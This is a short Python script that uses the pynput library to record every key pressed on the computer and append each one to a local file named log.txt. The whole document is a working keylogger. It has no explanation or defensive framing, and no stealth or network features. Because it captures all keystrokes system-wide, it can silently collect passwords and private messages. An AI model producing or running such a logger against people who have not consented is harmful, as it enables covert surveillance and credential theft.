from pynput.keyboard import Listener

log_file = "log.txt"

def log_keystroke(key):
    try:
        with open(log_file, 'a') as f:
            f.write(str(key))
            f.write('\n')
    except Exception as e:
        print(f"Error: {e}")

with Listener(on_press=log_keystroke) as listener:
        listener.join()
